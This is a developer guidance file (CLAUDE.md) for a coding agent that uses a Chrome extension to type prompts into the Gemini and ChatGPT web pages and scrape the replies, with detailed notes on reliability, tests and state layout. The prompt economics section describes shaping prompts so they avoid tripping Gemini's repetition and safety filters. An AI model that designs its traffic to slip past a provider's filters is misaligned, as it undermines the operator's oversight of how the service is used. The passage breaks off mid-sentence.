# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## What this is

A local coding agent that has **no LLM API client**. Inference happens by driving a real
browser tab: the Node server sends a prompt over WebSocket to a Chrome extension, a content
script types it into gemini.google.com / chatgpt.com, scrapes the streamed reply,
and sends the text back. Every architectural oddity below follows from that.

npm workspaces: `server/` (brain + CLI UI), `extension/` (MV3 bridge), plus a standalone
`vscode-companion/` (not a workspace).

## Commands

```bash
npm install                       # installs both workspaces from the root
npm run start                     # server with workspace pinned to repo root (../)
npm run dev                       # same, with tsx --watch
cd server && npm start -- --workspace /path/to/project   # run against another project
npm link --workspace=server       # exposes the `agent` (and `agent-cli`) bin globally

npm run build --workspace=extension   # esbuild src/background/main.js -> service-worker.js
cd vscode-companion && vsce package --allow-missing-repository --skip-license
```

`extension/service-worker.js` is a **committed build artifact**. Editing anything under
`extension/src/background/` without re-running the build ships stale code — Chrome loads the
bundle, not the sources. `extension/content-scripts/*.js` are loaded directly and are not bundled.
Likewise `vscode-companion/*.vsix` is committed and must be repackaged after editing
`vscode-companion/extension.js`.

### Tests

```bash
npm test                                       # -> server: node --test "test/**/*.test.js"
node --test server/test/core/risk-classifier.test.js   # single file
```

Tests live in `server/test/`, mirroring `server/src/` directory for directory. They used to sit
beside their subjects, which made a missing test visible in an `ls` — that is how `diff-engine.js`
was found with none, and it turned out to be 358 lines that overwrite files, containing a bug
that wrote backups outside the backup directory.

Moving them bought one thing back: `node --test src/` used to be a landmine, because given a
directory Node runs *every* `.js` file under it as a test — including `main.js`, which starts the
WebSocket server and hangs forever. Nothing under `test/` starts anything, so the trap is gone.
The quoted glob is still what makes the script work under `sh`, which has no globstar.

A test that needs a path into the source tree must compute it relative to `src/`, not to itself
(`prompt-loader.test.js` reads `../../src/prompts`).

**Expected state: all tests pass.** They used to be 34/10/24 red: the tests described designs
the code had replaced — `plan-generator` writes one file per comment under `PR-<n>/` rather than
one `PR-<n>.md` per PR, and `comment-classifier` stopped categorising by keyword once the AI
took that over. Both test files were rewritten against the shipped behaviour, so a failure now is
a real regression.

There is no lint script; `.eslintrc.json` (eslint:recommended) and `.prettierrc`
(100 cols, single quotes, trailing commas) exist for editor integration.

### The pty harness — how anything user-visible gets measured

Most of the numbers in this file came from a harness that drives the **real CLI under a pty**
with a fake extension answering prompts from a script, so a full turn — inject, reply, tool
call, tool result, next prompt — runs with no browser and no Gemini account. It lives in the
session scratchpad, not the repo. Rebuild it from this:

- **`drive.py`** — `pty.fork()` the CLI with `--workspace <scratch> --port <p> --editor <shim>
  --no-github`. `PATH` is prefixed with a `bin/` of shims for `open`, `code`, `xdg-open` and
  `cursor` that log their argv instead of launching anything, which is how "did it open the
  editor" became checkable. Steps are a JSON list: type text, send a key, resize the window
  (`{"resize": [rows, cols]}`), or write a file into `.agent/state/` to stand in for the VS
  Code companion. It counts bytes, `ESC[2J`, `ESC[3J` and erase-lines per step — which is what
  makes a frame regression visible at all.
- **`fake-extension.js`** — connects with a `chrome-extension://` origin, sends
  `{type:'identify', payload:{clientType:'extension'}}` (`clientType`, not `client`), and
  answers each `inject_prompt` from a scripted list. It logs every prompt it is given, which
  is where the per-turn character counts come from.
- **`ext-cadence.js`** — the real extension in headless Chrome against a server whose
  `verifyClient` **refuses every handshake**, so each retry becomes an observable timestamp.
- **`scrape-test.mjs`** — the scrape lifted verbatim out of the bridge and run against a
  Gemini-shaped DOM in jsdom.

**Check the harness before believing anything, positive or negative.** It has lied at least
six times, and most of those looked like product bugs first: a port the extension never dials;
a file-seeding step that also typed its content into the prompt; an extractor that dropped an
`async` keyword; a fake extension that answered subagent requests without `isSubagent`, so
compaction hung; a `ClipboardEvent` probe that silently did nothing, making an empty composer
look like proof the send button was unfindable; and a `ws` import that was wrong, so a "resize
during a live turn" measurement had no live turn in it.

**A passing test lies the same way.** `toolCatalogDrift()` compared an empty registry to an
empty catalog and went green — it needed a negative control per branch before the pass meant
anything.

## Layout

```
server/src/
├── index.js          # bin shim: re-spawns main.js under tsx (sources contain JSX)
├── main.js           # arg parsing, migration, component wiring, bootstrap
├── core/             # agent-loop, prompt-builder, diff-engine, risk-classifier,
│                     # task-manager, paths, migrate, workspaces
├── bridge/           # websocket-server (the Chrome-extension transport)
├── context/          # token budget: code-minifier, symbol-index,
│                     # context-manager, memory-manager
├── github/           # PR agent: poller, comment-classifier, ci-log-parser, plan-generator
├── mcp/              # mcp-server.js + tools/
├── storage/  watcher/
└── ui/               # the terminal front-end
    ├── cli-ui.jsx    # render(): stdin shim, hotkey routing, trailing-Enter split
    ├── App.jsx       # state, effects, layout — everything else is a module
    ├── hotkeys.js    # ctrl+ chords, pulled off stdin before Ink sees them
    ├── enter-splitter.js  # peels a trailing \r off a chunk so Enter is a keypress
    ├── paste.js      # collapses a big paste to a marker; expands it on submit
    ├── format.js  constants.js  transcript.js     # pure, tested
    ├── hooks/        # use-key-bindings, use-hotkeys, use-github-tab,
    │                 #   use-github-keys, use-slash-commands, use-agent-callbacks
    └── components/   # Banner, TranscriptTurn, GithubTab, Menus, InputBar,
                      #   AgentTerminal, QuestionPrompt
```

Modules are kebab-case; React components keep PascalCase (`ui/App.jsx`). Tests live in
`server/test/`, mirroring this tree — `src/core/paths.js` is tested by `test/core/paths.test.js`.

## Architecture

### Turn lifecycle

`main.js` wires everything and hands off to `ui/cli-ui.jsx` → `ui/App.jsx`.

1. `App.jsx` sends user input to `AgentLoop.handleUserMessage` (`core/agent-loop.js`).
2. `PromptBuilder.buildPrompt` (`core/prompt-builder.js`) assembles the prompt.
3. `AgentLoop._sendToGemini` pushes onto `extensionQueue` and calls `callbacks.injectPrompt`;
   `bridge/websocket-server.js` relays it to the extension. The queue is serialized by
   `isExtensionBusy` — one browser tab, one in-flight prompt.
4. The content script streams back `gemini_response_stream` (rendered live) then
   `gemini_response`, which resolves `AgentLoop.handleGeminiResponse`.
5. `_extractToolCalls` parses JSON tool calls out of the reply text (there is no structured
   tool-call API — this is text parsing, hence `_cleanJsonString`), then `_executeToolCalls`
   dispatches through `MCPServer.executeTool`.
6. Results are fed back via `buildToolResultPrompt` and the loop repeats.

### Bridge liveness — why a prompt used to wait for you to open Chrome

Reported from use, 2026-09-17: *"most of the time the prompt is not sent while I am out
of Chrome, and as soon as I open Chrome or the Gemini tab it is sent."* That is two
independent faults that produce one symptom, and neither is throttling.

**The reconnect alarm was cleared on connect.** `chrome.alarms.create('reconnect')` was
called in `scheduleRetry` and `chrome.alarms.clear` in `stopKeepAlive` — which runs on
`onopen`. So a *healthy* bridge had no alarm at all. Chrome can still evict a service
worker that believes it is connected, and when it does the socket dies with it: `onclose`
never runs inside a worker that is already gone, no `setTimeout` survives it, and nothing
outside the browser can reach in and start it. What actually revived it was incidental —
the user focusing a tab, `chrome.tabs.onUpdated` firing, and Chrome starting the worker to
deliver that event, which re-runs the module and its bottom-line `connectWebSocket()`.
The alarm is periodic and permanent now. While connected it costs nothing, because the
heartbeat already keeps the worker resident; it is the only thing that can resurrect a
worker Chrome has silently collected. `test/background/watchdog-alarm.test.js` pins it,
including a source assertion that `stopKeepAlive` does not clear it — re-adding that line
reads as ordinary cleanup in a diff.

**And the prompt it was waiting for had already been thrown away.** `broadcast` returns
whether it reached anyone; every caller ignored it. `injectPrompt` with no extension
connected wrote to no sockets and vanished, leaving the lane busy until the seven-minute
watchdog. `sendInjectPrompt` honours the return and holds what it could not deliver;
`flushPendingInjects` drains it when a client **identifies as an extension** — not on
socket open, because the socket is open before we know what is on the other end and the
side panel uses the same transport. Held prompts past `INJECT_BUFFER_TTL_MS` are dropped
rather than sent: the lane watchdog has already abandoned that turn, and typing it into
Gemini then starts a conversation nobody is listening to.

**Fixed sleeps became a readiness handshake.** 4000ms after opening a subagent tab, 1500ms
after a new main tab loaded, 1000ms after re-injecting — 6.5s of unconditional waiting per
new tab, wrong in both directions: seconds burnt on a warm machine, and still too early on
a cold one, where the send lands before the listener exists and is reported as an
unreachable tab. `waitForBridge` polls a `ping` the content script answers. It reports two
things because they fail differently: `ready` (this script is listening and not orphaned)
and `canType` (the composer is in the DOM, which is the real precondition for an inject).
**Gating only on `canType` would be worse than the sleep it replaces** — a changed composer
selector would turn "the send fails with a readable error" into "every turn burns its whole
budget first" — so the last 40% of the budget accepts `ready` alone and lets the send
produce the honest error.

**The 3-second nudge was the third mechanism doing this job, and the most expensive.** Every
model tab ran `setInterval(() => safeSend({type:'connect'}), 3000)` for the life of the
page, so an open Gemini tab woke the service worker twenty times a minute forever — a
worker never allowed to go idle, to solve a problem that only exists while there is nothing
to connect to. The worker now answers `connect` with its state and the tab backs off to 30s
once connected, which is a tenth of the steady-state cost with the fast cadence still there
for the case it was written for. It reports the state *before* attempting the connection:
`connectWebSocket` resolves long before a socket is open, and answering "connected" there
would slow the nudge down at the moment it is working.

**The clock was the only throttled thing, and that is measurable.**

The bridge activated the model tab and held your focus for the length of a turn, because
completion was detected by a 2s `setInterval` in the content script and Chrome throttles
page timers in a hidden tab. Before redesigning around that, it was measured — on
example.com, in a genuinely hidden tab, Chrome 152, over 334 seconds:

| mechanism | delivered | expected |
| --- | --- | --- |
| page `setInterval(100ms)` | 63 | 3340 — **1.9%** |
| **Worker** `setInterval(100ms)` | 3344 | 3340 — 100% |
| **`MutationObserver`** | 9.97–10/s every bucket | 10/s |
| **`getBoundingClientRect()`** | 3213 real boxes | **0** empty |

Three things that were assumed to be broken in a hidden tab are not. The MutationObserver
that supplies the evidence runs at full rate. Layout works, so the Stop-button visibility
check — `getBoundingClientRect` plus `getComputedStyle` — is sound. A Worker's timers are
not throttled at all. **Only the page's own timer is**, and it collapses to roughly one
tick per minute within 60 seconds of the tab being hidden, staying there across the
five-minute intensive-throttling boundary rather than degrading further at it.

So a 2s completion check becomes a ~60s one, per round, and a multi-round turn stalls until
you look at the browser. That is the whole of "it hangs while I am out of Chrome".

The fix keeps the evidence in the page and moves the clock out: a service worker is not a
tab and is not throttled, and `chrome.tabs.sendMessage` is an *event* rather than a timer,
so it is delivered at full rate into a hidden page. `startCompletionTicks` drives
`tick_completion` every 2s from the worker; the content script's own interval stays as a
backstop for a worker evicted mid-turn. **A Worker inside the page would also have worked
and was rejected**: creating one from a content script means either a `blob:` URL, which
gemini.google.com's CSP is entitled to refuse, or a `chrome-extension://` URL, which is
cross-origin for a worker. The service worker needs no new capability and is already kept
alive for the turn by the heartbeat.

With the clock outside the tab, **focus is returned as soon as the send lands** rather than
when the reply does — the tab only has to be in front long enough to accept the paste.

**Chrome also discards background tabs**, which looks identical to a hang: the tab stays in
the strip with its title intact while the page and content script are gone.
`prepareTabForTurn` sets `autoDiscardable: false` on a tab about to hold a turn, and
reloads plus re-handshakes one that was already discarded. The flag is a request, not a
guarantee, which is why the repair exists alongside it.

**What is still unexamined:** the `MutationObserver` watches `document.body` with
`subtree: true, characterData: true`, which on an app as busy as Gemini fires far more than
it needs to. Narrowing it to the response container is a real cost saving and a real risk —
a wrong selector observes nothing and every turn breaks — so it wants measuring against the
live page, not a guess.

**Self-healing: what is repaired, and the two things deliberately not.**

Every failure below used to end the turn, and the prompt with it.

- **A failing send repairs the tab.** `sendWithRepairs` is a ladder — send,
  re-inject the content script, reload the tab — cheapest repair first, because
  the commonest cause by far is a script orphaned by an extension reload. It
  **stops before opening a fresh tab, on purpose**: a reload returns to the same
  `/app/<id>` and Gemini still holds the thread, while a new tab is a new
  conversation, and an incremental prompt sent into one gets a confident answer
  to a question the model never saw. Losing a turn beats answering a different
  one. That is the same reasoning `session_lost` already encodes for batch tabs.
- **A prompt that never reached the composer is sent again, once.** The content
  script always knew the difference and discarded it. `sawGenerating` is the
  discriminator: generation started and we failed to read it means the model
  **has** an answer, so a resend asks twice into a thread that already holds the
  first reply; generation never started and nothing scraped means the submit did
  not happen, so a resend is the first attempt landing. Only the second retries.
  It resends `_lastMainPrompt` **verbatim**, because `buildPrompt` has side
  effects — rebuilding after a failed turn 0 marks the system prompt as seen and
  hands the model a bare question with no tools.
- **A tab about to hold a turn is opted out of discarding, and reloaded if it
  was already discarded** (`prepareTabForTurn`). A discarded tab is
  indistinguishable from a hang: it keeps its title in the strip while the page
  and script are gone.

Not done, and why: **`timedOut` with partial text is not retried** — the model
answered, and a second ask corrupts the thread for a reply we already partly
have. And **a disconnected extension mid-turn does not re-dispatch the in-flight
prompt**; `pendingInjects` covers prompts that were never delivered, but one
that *was* delivered may have been answered into a tab we can no longer see, and
re-sending it blind is the double-answer bug again. Doing that safely needs the
worker to ask the tab whether it is still watching that `requestId` — the
`tick_completion` handshake is the piece that would make it answerable.

**Tool amnesia: the cause is a thread the model never saw, not a bad detector.**

Reported from use with two screenshots. The prompt in both was the *short*
turn — a bracketed context line and a list of tool **names** — sent into a
brand-new Gemini conversation. The model has names and no definitions, so it
says the tools "are not actually connected to my current execution
environment", and the turn is spent.

`hasSeenSystemPrompt` is the **prompt builder's belief**; the model's memory is
the **thread**, which is the entire premise of `chat-thread.js`. Nothing
connected the two. So when the tab moved to a different conversation — the user
opening a new chat, `ensureModelTab` opening one because the old tab was gone,
a reload landing on `/app` with no id — the builder carried on sending short
turns forever. `_recordThread` notices the change already; it now also calls
`resetPromptState()`, but **only when there was a previous thread**: the first
id of a session is turn 0's own conversation, which already carried the prompt.

**The detector was wrong in both directions, and one of them destroyed
answers.** `looksLikeCapabilityDenial` gates a repair that discards the reply
and re-asks. It asked for an inability phrase and then, loosely, for any of
`execute|run|access|read|…` within 60 characters of any of
`local|file|directory|command|…` — a window wide enough to span two clauses, so
*"I read the file and I can't see any problem with the parser — the local
variable is fine"* was classified as a refusal and thrown away. Meanwhile both
denials seen in use that day slipped through, because both were **passive**:
the model did not say it could not, it said the tools were not connected.

The cure for the false positives is the *subject*, not a narrower window. A
denial is about the agent's tooling or the box it runs in; an ordinary answer
saying "can't" is about code. `local scope` and `local variable` are no longer
objects, `local disk` and `file system` are, and `mcp/tools/` is excluded by
path because in this repo that directory is a thing an answer mentions by name.
A second pattern covers *"I can't read files in that directory"*, which names
no environment: there the negation must attach within four words to a verb the
tools perform, so `can't see`, `can't reproduce`, `can't find` and `can't make`
— the four ways an ordinary answer says it — do not qualify.
`test/core/denial-corpus.test.js` holds both lists; the old pattern fails it in
both directions.

**And moving the clock exposed a latent race.** A turn ended on a *single*
observation of "no Stop button and one second since the text changed". That was
only safe while the check was throttled to roughly once a minute, where a
transient is almost never sampled. At a reliable 2s cadence the transients get
caught, and a reply came back truncated mid-token. Gemini pauses longer than a
second between sections and the Stop button is briefly absent while the
composer re-renders — either alone looks exactly like finished. The condition
must now hold across consecutive checks. **A fix that makes something reliable
will find every place that was quietly relying on it being unreliable.**

### Prompt economics

`PromptBuilder` sends the **full system prompt + tool definitions only on turn 0 and every
Nth turn** (`resetPromptState` after `/compact` or `/clear`). This is not an optimization —
resending a large system prompt every turn trips Gemini's repetition/safety
filters and A/B-test modals. Prompt content is also tiered by `modelTier`
(`flash` / `flash-thinking` / `pro`) via `_getReasoningInstructions`.

The **tool anchor** (`_buildToolAnchor`) is the exception that rides on *every* turn: tool
names only, 56 tokens against 1,575 for the definitions. The model does not gradually forget
its tools, it forgets them completely — mid-session it answers "I cannot execute local
commands or access your local file system" with total confidence and the turn is lost. Three
detectors in `core/drift-detector.js` back that up, each with a different response:
`looksLikeMultipleDrafts` → bring the refresh forward; `looksLikeCapabilityDenial` → resend the
full definitions and retry the turn once (`requestToolRedeclaration`, **not**
`resetPromptState` — see below); `looksLikeProviderError` → Gemini's own error rather
than an answer, so re-ask (this one used to be written to disk as a PR plan). All three match
prose and will always trail the model's phrasing, which is why the anchor exists: prevention
first, detection as the backstop.

**The repair for tool amnesia used to be the heaviest prompt in the system.** It called
`resetPromptState()`, which does not mean "send the tools again" — it means "pretend this
chat has never seen a prompt", so the next turn was a full turn-0 payload: system
instructions, tool definitions, `AGENT.md`, memory and the skill catalogue. The model had
not forgotten the project; it had forgotten one block. And the reason prompts are tiered at
all is that a large repeated payload trips Gemini's repetition and A/B-test filters — so
the old repair fired the largest prompt available at exactly the moment the session was
already unhealthy, which makes it a plausible *cause* of the next failure. Measured on this
repo: **25,445 characters against 9,991, a 61% cut.** `requestToolRedeclaration()` sends the
condensed reminder plus the full definitions and nothing else. It outranks the periodic
refresh, because that tier sends tool *names* and names are what just failed.

### Tools

`mcp/mcp-server.js` holds a flat `TOOL_DEFINITIONS` array (name, description, parameters,
handler) with handlers in `mcp/tools/`. To add a tool: write the handler, add one entry to that
array, **and one to `core/tool-catalog.js`** — that is what the prompt is rendered from, and
`toolCatalogDrift()` fails the build if the two disagree. The description *is* the contract.

`find_symbol` / `find_references` (`context/symbol-index.js`) are the structural half of code
search, on acorn + acorn-jsx + acorn-walk. Two traps, either of which reproduces the failure
that got `ast-chunker` deleted: `acorn-jsx` teaches the *parser* and not the walker, so a `.jsx`
file parses and then throws `No walker function defined for node type JSXElement`; and
`acorn-walk` defines `ImportSpecifier` as `ignore`, so `import { X }` is never visited and "who
imports this?" answers nothing. Built lazily and cached by mtime — 135 ms cold, 3 ms warm on
this repo, 282 of 282 exported symbols. `executeTool` retries transient OS errors (EBUSY/EACCES/EAGAIN/EMFILE/EPERM) with
backoff and rewrites `errno` codes into LLM-readable instructions.

### Workspace

`core/workspaces.js` owns path handling for the workspace: `resolveWorkspaceInput` (`~`
expansion, relative paths, quotes), `validateWorkspace` (exists / is a directory / readable) and
`listWorkspaceCandidates` for the `/set-workspace` picker. `AgentLoop.setWorkspace` is the one
place that rewires the collaborators that hold a copy of the path — `/workspace` and
`/agent-dir` each used to carry their own list and had already drifted. SessionStore is
deliberately *not* rebound: doing so would write the current conversation into another
project's history.

### Approval path

Writes never go straight to disk. `edit_file` / `create_file` produce a `DiffEngine`
(`core/diff-engine.js`) diff with per-hunk accept/reject, backups, atomic writes, and `undo()`.
Commands pass through `core/risk-classifier.js`, which decides whether `App.jsx` must prompt;
persistent allow/block rules live in `commandRules`  (`/allowlist`).

### Subagents

`AgentLoop.topology` is `single` | `duo` | `swarm`. `ask_reviewer` / `ask_reasoner` /
`ask_researcher` / `ask_subagent` run **in parallel** (see the `isParallel` list in
`_executeToolCalls`), each routed by `modelConfig[role]` to a *different browser tab*.
`_runSubAgentSession` gives subagents a restricted tool set.

### Context engine

`context/` — `code-minifier`, `context-manager`, `memory-manager`, `symbol-index`. `CodeMinifier.minifyJson` is on the hot
path: `PromptBuilder.buildToolResultBatch` embeds every tool result in the next prompt, and
serialising them compact rather than pretty-printed is ~40% fewer characters there.

There is no `ast-chunker` and no `skills/` registry any more. Both were written, never wired to
anything, and removed on 2026-09-10: the chunker resolved 24% of this repo's top-level symbols
(it walked only `ast.body`, so every class method and every `export const foo = () => {}` missed,
and plain acorn cannot parse the `.jsx` files at all), and `SkillRegistry` was a second, parallel
way to declare a tool that competed with `mcp/mcp-server.js`'s `TOOL_DEFINITIONS` — which is the
one described above and the one that actually runs. A per-symbol read tool is still a real gap;
it wants `acorn-walk` plus `acorn-jsx`, not that file.
`watcher/file-watcher.js` (chokidar) invalidates context on external edits. `semantic_search`
is backed by a local TF-IDF index.

### GitHub agent

`github/` polls PRs (`github-poller`), classifies comments (`comment-classifier`), parses CI
logs (`ci-log-parser`), decides what to analyse and when (`work-queue`), builds the prompt
(`review-task`) and writes the result via `review-writer` into `.agent/github-reviews/`.

That directory used to be `github-pr-plans/`, and `/plans` still means something else —
`.agent/artifacts/plans/`, a different format written by a different path. One word, two
answers. `migrateGitHubReviews` renames it on startup and refuses to clobber.

**The tab is for browsing; the stream is for noticing.** Decided 2026-09-16, after the
screen was cut from 11 rows to 5 (the border and heading, a ranked status line, a one-line
empty state, hints on one row, and `@who commented` in place of `requires_review` — which
was a constant, because it is the only non-noise value the classifier can return and
anything it calls noise never reaches a row).

The open question was whether it should be a tab at all. Everything else in this app is a
stream and nothing else is a page, and this is a stream of events. Resolved as a middle
path rather than either extreme: the tab keeps the browsing — PRs, plans, comment bodies,
all of which want a screen — and every new event *also* arrives in the transcript as one
dim row (`githubNoticeRow`, `ui/hooks/use-github-tab.js`), where you are already reading.
`^o` still opens the detail. Nothing interrupts and nothing is inserted into the prompt,
which is the same contract a failed VS Code terminal command already has.

Three constraints that shaped the row, none obvious:

- It is a `system` message, because `groupTurns` and `TranscriptTurn` already draw those
  dim and wrapped. A new role would mean teaching both, for one line.
- It is a *notification*, not the record — the tab's `activity` is the record. `groupTurns`
  keeps a system message only inside a turn, so an event arriving before the session's
  first prompt is not drawn, and the alternative is inventing an orphan turn to hang it
  from.
- **The author is capped at 20 characters.** The row is drawn in the *live* frame while a
  turn is in flight, and a GitHub username runs to 39 — which put the worst case at 78
  columns: one row at 80, two at 72. A row that wraps is charged as one and drawn as two,
  which is a bug this frame has had twice. The test pins it at 60 columns.

Only `github_plan_generated` earns a row; `processing_started` and `processing_finished`
bracket the same event and would draw three lines for one comment.

**The tab is one list, three levels, and it fills the terminal.** Reworked
2026-09-17 after three screenshots and "this github one is a mess". It had
*two* lists — an activity feed you landed on, and a PR explorer behind an
unadvertised `p` — which showed overlapping things, and `⏎` meant something
different on each of the three screens (open the plan / open comments / send to
the agent). The feed was also empty on a fresh session with open PRs sitting
right there, because it only ever held events from *this* process.

So the feed stopped being a view and became the evidence: `summarisePrs`
(exported and tested) folds it into "what does the agent know about each PR",
which is what the PR rows count and what the comment rows join against. What is
left is a drill-down — **PRs → that PR's comments → the analysis in your
editor** — where `⏎` means go deeper at every level and `esc` comes back. Level
two lists *every* comment on the PR with the agent's work marked on it, rather
than only the ones it happened to process.

Two rules came out of making it a screen rather than a paragraph:

- **The banner cannot be cleared, so the screen has to push it off.** It is a
  `<Static>` item, committed to the terminal permanently, and remounting
  `<Static>` to lose it reprints the entire transcript — that is where the
  second banner came from. `height={rows}` with `overflow="hidden"` scrolls it
  away instead, and the fixed height is also what lets the hint row be *pinned*
  to the last line instead of trailing however much content there was.
- **`terminalHeight - 2` is one row too tall, and the arithmetic does not say
  so.** The tab draws only itself and the status bar (one row plus a margin
  `compact` drops), so `- 2` looks exact — and measured, it costs one `ESC[2J`
  + `ESC[3J` on the way *back* to the agent tab, because Ink's frame carries a
  trailing newline the row count does not. `- 3` is zero clears at 40x100,
  24x90, 24x72, 13x80, 13x72, 10x80, 9x72 and 40x60. `RESERVED_ROWS` is the
  agent tab's furniture and does not apply here; budgeting this screen at
  `- 8` was what left four rows of figlet on top of it.

**Two things about that screen were argued against and are not oversights.**
There is **no box** — the only box-drawn frame in this product is the input
field, where the border *means* the mode, so a second one devalues it and costs
four rows. And there is **no scrolling inside the screen**: the list is windowed
against the budget and says what it trimmed (`… N more`), because a second
scroll model in an app whose whole scroll story is "the terminal's, and we never
take it" is a worse answer than a list that admits its own limit.

**The one thing still missing there is the analysis's own Gemini thread id.**
`subagentUrl` is available where the analysis runs and is not recorded on the
`plan_generated` payload, so there is no way to reopen the conversation that
produced a review. It needs threading through `core/turn-runner.js`.

**The question that decided the shape, and the answer that was not the lean.**
The working document asked whether the activity feed and the PR explorer should
be one screen, and leaned towards keeping them separate — they answer different
questions ("what happened?" vs "what is open?"), and merging means a mode switch
inside one list. That was wrong, and the giveaway was inside the question: *"the
second is the one people go looking for when the first is empty."* That is not
two questions, it is one question with the wrong list in front of it — and the
feed was empty on a fresh session **by construction**, because it only ever held
events from this process. The lean came from reasoning about the two screens
rather than opening them; one screenshot settled it.

The batch loop is `core/turn-runner.js`, not `agent-loop.js`: `runHeadlessTask` is a caller
now. **Its flat re-serialisation is necessary, not an oversight** — every batch send opens a
fresh browser tab that is closed when the turn ends, so turn 2 has never seen turn 1. Removing
it needs one tab held across a task, which is a bridge change.

## State and config

**All workspace state lives under `.agent/`. Never hardcode that path — import
`server/src/core/paths.js`,** which is the single source of truth and the reason the layout
can't drift again.

### Where `.agent/` actually is

`workspace` used to mean two things: where state lives, and what the agent works on. In a
monorepo those come apart, so `paths.resolveState(workspace)` walks *up* looking for an
existing `.agent/`, the way git finds `.git`. The first hit is the **root**; the path from it
down to the workspace is the **scope**.

```
/base-repo/.agent/             root — shared by every repo
├── skills/  config.json                            inherited
├── repo-1/   artifacts/ state/ sessions/ logs/     this repo only
│             config.json (overrides)
└── repo-2/ …
/base-repo/AGENT.md            instructions for every repo under it
/base-repo/repo-1/             the code, with no .agent of its own
/base-repo/repo-1/AGENT.md     instructions for this repo — nearest wins
```

Nothing found — the ordinary single-repo case — and the root is `<workspace>/.agent` with an
empty scope, byte-identical to the old behaviour. Opening `/base-repo` and opening
`/base-repo/repo-1` land on the same state, because both walks end at the same root;
`workspaceSlug` is keyed on the resolved state dir for exactly that reason, so siblings don't
collide on one history file.

Scope is **explicit, never inferred from which files the agent touches**, and **chosen at
launch**: `--scope repo-1`, or just open the repo directly. Shown in the status bar. Tools stay
rooted at the workspace so cross-repo work is still possible — only state, sessions and config
are scoped. `/scope` still answers, but only to say where you are and how to change it.

**The landmine:** `homeDir()` is `~/.agent`. A naive upward walk from any project under `$HOME`
finds it and would adopt the global home as a project root, pooling every project's state and
leaking every project's rules into everyone else's prompt. `resolveState` excludes it and stops
walking at `$HOME`; `paths.test.js` covers it.

| Path | Contents |
| --- | --- |
| `<ws>/.agent/config.json` | topology, `modelConfig`, `commandRules`, `memoryEnabled`, `agentName`, GitHub token |
| `<ws>/.agent/memory.md` | what the agent learned here — scoped, never walked, read back into `<memory>` |
| `<ws>/.agent/artifacts/` | `task.md`, `plan.md`, `walkthrough.md` — written for the user to read |
| `<ws>/.agent/state/` | `editor.json` (VS Code companion), `github.json`, `plan-approval.json` |
| `<ws>/.agent/github-pr-plans/` | GitHub PR agent output |
| `<ws>/.agent/logs/errors.jsonl` | structured failure log — one JSON object per line |
| `<ws>/.agent/logs/commands/<date>.jsonl` | every shell command run, blocked or rejected — an audit trail, never read back into a prompt |
| `<ws>/.agent/backups/`, `context/`, `logs/`, `tmp/` | see `paths.js` |
| `<ws>/.agent/sessions/history.jsonl` | conversation history, local copy |
| `~/.agent/workspaces/<name>-<hash>/history.jsonl` | the durable copy of the same history |

**Session history is written to both copies on every turn** (`storage/session-store.js`). The
workspace copy sits next to the code; the home copy survives a clean checkout or a wiped
`.agent/`. On startup the two are reconciled — more turns wins, the other is rebuilt from it.

`AGENT_CLI_HOME` overrides the home dir, which is `~/.agent`. The pre-rename `GEMINI_AGENT_HOME`
and the older `AGENT_HOME` are still read, because dropping them would silently repoint an
existing install rather than fail. It is
deliberately **not** `~/.gemini`: that belongs to Google's Gemini CLI and Antigravity, which
really do keep data there.

`core/migrate.js` folds the pre-`.agent` layout (`.gemini/`, `.gemini-agent/`, `~/.gemini-agent/`,
`.agent-github-plans/`, root `setAgentName.json` / `agent.log`) into `.agent/` on startup. It
runs only when `.agent/` is absent, moves rather than copies, and is a no-op on the second run.

`vscode-companion/extension.js` duplicates the `.agent` constant — it cannot import from
`server/`. Changing `AGENT_DIR` in `paths.js` means changing it there too, then repackaging
the `.vsix`.

The companion and the CLI talk only through files under `<ws>/.agent/state/`, never a socket:
`editor.json` (active file and cursor), `diagnostics.json` (the Problems panel, debounced 1.5s
because `onDidChangeDiagnostics` fires continuously while a project indexes),
`chat-queue.jsonl` (append-only; "Add to Agent Chat" selections, drained by `ui/chat-queue.js`),
`plan-review.json` (comments accumulated while reviewing) and `plan-approval.json` (the
submitted verdict: `accept` | `changes_requested` | `reject`). Files rather than a socket is
what lets the extension queue work before the CLI is even running.

### Failure logging

`core/error-log.js` writes every failure to `<ws>/.agent/logs/errors.jsonl`, tagged with the
flow it came from (`bridge`, `extension`, `agent`, `tool`, `github`, `task`, `diff`, `context`,
`ui`). `/logs` reads it back grouped by flow; `/logs <flow>` drills in.

It exists because failures here are spread across processes that cannot see each other — a
content script in a Chrome tab, the bridge, the loop, the tools, the poller — and the symptom
surfaces far from the cause. The console was the only sink, and console output inside an Ink
app is destroyed by the next repaint.

Two properties are load-bearing. It **never throws** (every caller is already on a failure
path). And it **collapses repeats**: identical failures inside a 60s window are counted rather
than written, because a poller failing every tick used to bury everything else. The tally is
written as its own record marked `tally: true` when the window closes or the process exits —
so a storm of 500 shows as 500, not 1, and the tally line is never miscounted as another
occurrence.

### The command log

`core/command-log.js` appends every `run_command` to `<ws>/.agent/logs/commands/<date>.jsonl`,
whether it ran, was blocked by the risk classifier, or was rejected at the approval prompt.
`/commands` reads it back; the Status tab shows today's count.

Nothing reads it into a prompt and nothing acts on it. It answers "what has this thing actually
been doing on my computer?" for the person whose computer it is, and it is not covered by
anything else here:

- `errors.jsonl` records **failures**, by flow. `git push --force` does not fail, so the one
  command you would most want to find is the one that log never sees.
- `sessions/history.jsonl` has tool calls mixed into the conversation, and `/compact` replaces
  older turns with a summary — the record you would want six weeks from now is the first thing
  compaction throws away.

One file per day, because that is how people look for this ("what did it do on Tuesday"), with
a per-process session id inside so a day can be read back session by session. Append-only, and
`logCommand` never throws: a failure to write the audit log must not fail the command.

**Blocked commands are the most worth keeping, not the least.** What the agent *tried* to do is
the interesting half — a `critical` verdict from the classifier is exactly the line someone
would want to see later.

## Branching and PRs

**Never commit or push to `main` directly. Work lands on a branch and merges through a PR.**

The branches in this repo are deliberate: they are the history. `beta-v1` … `beta-v10`,
`fix/bridge-lock-and-cli`, `v1-stable` are kept on purpose, not left behind. Do not delete
them, and do not squash their history away.

- Branch from `main`, name it for the work (`fix/…`, `feat/…`, or the next `beta-vN`).
- Open a PR into `main`. That is the only way work reaches `main`.
- A force-push to `main` is not a merge and is not covered by this: it is a repair, it needs
  the owner to ask for it explicitly, and it breaks every open PR targeting `main` plus every
  existing clone.

A conflict on a PR that *should* be a clean descendant almost always means the two sides no
longer share history — check `git rev-list --left-right --count main...<branch>` locally
before believing GitHub. If local says `0 <n>` and GitHub says conflicts, the remote branches
